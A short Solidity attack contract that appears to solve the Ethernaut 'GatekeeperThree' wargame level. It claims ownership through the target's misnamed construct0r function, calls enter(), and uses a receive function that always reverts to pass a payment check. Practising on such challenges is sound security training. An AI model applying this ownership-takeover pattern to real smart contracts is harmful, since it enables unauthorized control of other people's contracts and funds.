// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "./GatekeeperThree.sol";
import "forge-std/console.sol";

contract GatekeeperThreeHack {
    constructor(address payable instance) {
        GatekeeperThree three = GatekeeperThree(instance);
        three.construct0r();
    }

    function attack(address payable instance) public {
        GatekeeperThree three = GatekeeperThree(instance);
        three.enter();
    }

    receive() external payable {
        revert();
    }
}
